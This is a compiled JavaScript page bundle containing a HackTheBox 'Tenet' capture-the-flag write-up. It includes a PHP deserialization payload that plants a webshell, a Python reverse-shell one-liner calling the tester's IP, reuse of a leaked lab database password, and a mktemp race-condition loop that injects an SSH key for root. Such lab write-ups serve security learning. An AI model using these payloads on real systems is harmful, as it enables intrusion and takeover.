"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8175],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>b});var a=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function o(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},s=Object.keys(e);for(a=0;a<s.length;a++)t=s[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(a=0;a<s.length;a++)t=s[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),p=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):o(o({},n),e)),t},u=function(e){var n=p(e.components);return a.createElement(l.Provider,{value:n},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},h=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,s=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),c=p(t),h=r,b=c["".concat(l,".").concat(h)]||c[h]||d[h]||s;return t?a.createElement(b,o(o({ref:n},u),{},{components:t})):a.createElement(b,o({ref:n},u))}));function b(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var s=t.length,o=new Array(s);o[0]=h;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[c]="string"==typeof e?e:r,o[1]=i;for(var p=2;p<s;p++)o[p]=t[p];return a.createElement.apply(null,o)}return a.createElement.apply(null,t)}h.displayName="MDXCreateElement"},23145:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>s,metadata:()=>i,toc:()=>p});var a=t(87462),r=(t(67294),t(3905));const s={layout:"post",title:"Tenet ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web","php","deserialization","sudo","race-condition"],date:"2021/06/14 22:27:00",thumbnail:"/img/HackTheBox/tenet.png",toc:!0},o="Information",i={unversionedId:"HackTheBox/Tenet/write-up",id:"HackTheBox/Tenet/write-up",title:"Tenet ",description:"- Name: Tenet",source:"@site/writeups/HackTheBox/Tenet/write-up.md",sourceDirName:"HackTheBox/Tenet",slug:"/HackTheBox/Tenet/write-up",permalink:"/writeups/HackTheBox/Tenet/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"web",permalink:"/writeups/tags/web"},{label:"php",permalink:"/writeups/tags/php"},{label:"deserialization",permalink:"/writeups/tags/deserialization"},{label:"sudo",permalink:"/writeups/tags/sudo"},{label:"race-condition",permalink:"/writeups/tags/race-condition"}],version:"current",frontMatter:{layout:"post",title:"Tenet ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web","php","deserialization","sudo","race-condition"],date:"2021/06/14 22:27:00",thumbnail:"/img/HackTheBox/tenet.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Tabby ",permalink:"/writeups/HackTheBox/Tabby/write-up"},next:{title:"Traceback ",permalink:"/writeups/HackTheBox/Traceback/write-up"}},l={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"Web enumeration",id:"web-enumeration",level:2},{value:"Web exploitation",id:"web-exploitation",level:2},{value:"Shell upgrade",id:"shell-upgrade",level:2},{value:"Privilege Escalation of Machine : from neil to root",id:"privilege-escalation-of-machine--from-neil-to-root",level:2}],u={toc:p},c="wrapper";function d(e){let{components:n,...s}=e;return(0,r.kt)(c,(0,a.Z)({},u,s,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Tenet"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://app.hackthebox.eu/machines/309"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Tenet",src:t(4477).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap wpscan bfac\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Port and service scan with nmap:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# Nmap 7.91 scan initiated Sun May  2 16:12:39 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.223\nNmap scan report for 10.10.10.223\nHost is up (0.028s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)\n|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)\n|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-methods:\n|_  Supported Methods: HEAD GET POST OPTIONS\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sun May  2 16:13:14 2021 -- 1 IP address (1 host up) scanned in 36.61 seconds\n")),(0,r.kt)("h2",{id:"web-enumeration"},"Web enumeration"),(0,r.kt)("p",null,"As we are facing a Wordpress we can launch a vulnerability scan + user enumeration\nwith wpscan:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ wpscan --url http://tenet.htb -e u\n")),(0,r.kt)("p",null,"The two vulnerabilities found are authenticated so we can't exploit them.\nTwo users are found: ",(0,r.kt)("inlineCode",{parentName:"p"},"neil"),", ",(0,r.kt)("inlineCode",{parentName:"p"},"protagonist"),"."),(0,r.kt)("p",null,"It's possible to try to bruteforce the password for those two users but it's not very efficient:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ wpscan --url http://tenet.htb --no-banner -U users.txt -P /usr/share/wordlists/passwords/rockyou.txt\n")),(0,r.kt)("p",null,"I tried to find any vhost but without success:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ffuf -u http://tenet.htb/ -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:cyfun -H 'Host: cyfun.tenet.htb' -fs 10918\n")),(0,r.kt)("p",null,"There is an interesting comment on wordpress:"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!")),(0,r.kt)("p",null,"A post is also giving another hint:"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"We're looking for beta testers of our new time-management software, 'Rotas'"),(0,r.kt)("p",{parentName:"blockquote"},"'Rotas' will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!"),(0,r.kt)("p",{parentName:"blockquote"},"For more information regarding opting-in, watch this space.")),(0,r.kt)("p",null,"So I tried to find some backup files with ffuf and bfac but I only got some false positives."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ ffuf -u http://tenet.htb/satorFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt\n...\n\n.phps                   [Status: 403, Size: 274, Words: 20, Lines: 10]\n:: Progress: [39/39] :: Job [1/1] :: 15 req/sec :: Duration: [0:00:04] :: Errors: 0 ::\n\n$ ffuf -u http://tenet.htb/rotasFUZZ -c -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt\n...\n\n.phps                   [Status: 403, Size: 274, Words: 20, Lines: 10]\n:: Progress: [39/39] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:02] :: Errors: 0 ::\n\n$ bfac -u http://tenet.htb/sator\n$ bfac -u http://tenet.htb/rotas\n")),(0,r.kt)("p",null,"While you don't find there is a file sator.php hosted on tenet.htb you have to\nguess it's served with the IP address ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.223/sator.php"},"http://10.10.10.223/sator.php")," (default fallback vhost probably)."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"[+] Grabbing users from text file\n[] Database updated\n")),(0,r.kt)("p",null,"We can find the backup file with bfac:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ bfac -u http://10.10.10.223/sator.php\n...\n[i] URL: http://10.10.10.223/sator.php\n[$] Discovered: -> {http://10.10.10.223/sator.php.bak} (Response-Code: 200 | Content-Length: 514)\n\n[i] Findings:\nhttp://10.10.10.223/sator.php.bak (200) | (Content-Length: 514)\n")),(0,r.kt)("h2",{id:"web-exploitation"},"Web exploitation"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"sator.php.bak")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n\nclass DatabaseExport\n{\n  public $user_file = 'users.txt';\n  public $data = '';\n\n  public function update_db()\n  {\n    echo '[+] Grabbing users from text file <br>';\n    $this-> data = 'Success';\n  }\n\n\n  public function __destruct()\n  {\n    file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);\n    echo '[] Database updated <br>';\n  //    echo 'Gotta get this working properly...';\n  }\n}\n\n$input = $_GET['arepo'] ?? '';\n$databaseupdate = unserialize($input);\n\n$app = new DatabaseExport;\n$app -> update_db();\n\n\n?>\n")),(0,r.kt)("p",null,"There is a PHP deserialization here that allow us to upload any arbitrary content."),(0,r.kt)("p",null,"We can even find a ",(0,r.kt)("a",{parentName:"p",href:"https://security.stackexchange.com/questions/176263/why-does-this-php-object-injection-exploit-work"},"similar case")," on security stackexchange."),(0,r.kt)("p",null,"My PoC to generate the serialized webshell payload:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n\nclass DatabaseExport\n{\n  public $user_file = 'cyfun.php';\n  public $data = '<?php system($_GET[\"cmd\"])?>';\n}\n\n$klass = new DatabaseExport();\n\n$payload = serialize($klass);\n\necho $payload;\n")),(0,r.kt)("p",null,"Here the URL-encoded form:"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22cyfun.php%22;s:4:%22data%22;s:28:%22%3C?php%20system($_GET%5B%22cmd%22%5D)?%3E%22;%7D"},"http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:9:%22cyfun.php%22;s:4:%22data%22;s:28:%22%3C?php%20system($_GET[%22cmd%22])?%3E%22;}")),(0,r.kt)("p",null,"Then we can access teh webshell and execute a command: ",(0,r.kt)("a",{parentName:"p",href:"http://10.10.10.223/cyfun.php?cmd=id"},"http://10.10.10.223/cyfun.php?cmd=id")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n")),(0,r.kt)("p",null,"We know the upload and command exec works so let's execute a reverse shell:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.44",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\n')),(0,r.kt)("p",null,"We receive it on our reverse shell:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\nid\nINFO: Client connected from 10.10.10.223:59112 (family 2/IPv4, TCP)\n/bin/sh: 0: can't access tty; job control turned off\n$ uid=33(www-data) gid=33(www-data) groups=33(www-data)\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"cat /etc/passwd")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nlxd:x:105:65534::/var/lib/lxd/:/bin/false\nuuidd:x:106:110::/run/uuidd:/usr/sbin/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:109:1::/var/cache/pollinate:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false\nneil:x:1001:1001:neil,,,:/home/neil:/bin/bash\n")),(0,r.kt)("h2",{id:"shell-upgrade"},"Shell upgrade"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"/var/www/html/wordpress")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"...\n/** MySQL database username */\ndefine( 'DB_USER', 'neil' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'Opera2112' );\n\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n...\n")),(0,r.kt)("p",null,"We can re-use DB password over SSH: ",(0,r.kt)("inlineCode",{parentName:"p"},"ssh neil@tenet.htb"),"."),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-neil-to-root"},"Privilege Escalation of Machine : from neil to root"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ sudo -l\nMatching Defaults entries for www-data on tenet:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:\n\nUser www-data may run the following commands on tenet:\n    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh\n")),(0,r.kt)("p",null,"A script can be run as root via sudo: ",(0,r.kt)("inlineCode",{parentName:"p"},"/usr/local/bin/enableSSH.sh")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'#!/bin/bash\n\ncheckAdded() {\n        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)\n        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then\n                /bin/echo "Successfully added $sshName to authorized_keys file!"\n        else\n                /bin/echo "Error in adding $sshName to authorized_keys file!"\n        fi\n}\n\ncheckFile() {\n        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then\n                /bin/echo "Error in creating key file!"\n                if [[ -f $1 ]]; then /bin/rm $1; fi\n                exit 1\n        fi\n}\n\naddKey() {\n        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)\n        (umask 110; touch $tmpName)\n        /bin/echo $key >>$tmpName\n        checkFile $tmpName\n        /bin/cat $tmpName >>/root/.ssh/authorized_keys\n        /bin/rm $tmpName\n}\n\nkey="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"\naddKey\ncheckAdded\n')),(0,r.kt)("p",null,"Since ",(0,r.kt)("inlineCode",{parentName:"p"},"mktemp")," will create a random file we need to make a race condition\nto write our SSH pub key into it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"#!/bin/bash\n\nkey='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch'\n\nwhile true\ndo\n    echo $key | tee /tmp/ssh-* > /dev/null\ndone\n")),(0,r.kt)("p",null,"We execute that while running ",(0,r.kt)("inlineCode",{parentName:"p"},"sudo /usr/local/bin/enableSSH.sh"),".\nSeveral tries may be necessary because race conditions doesn't always work the 1st time."),(0,r.kt)("p",null,"Then we can connect as root."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"ssh root@tenet.htb -i ~/.ssh/id_ed25519")))}d.isMDXComponent=!0},4477:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/tenet-158a2df54841c2b7d9720dcd59185582.png"}}]);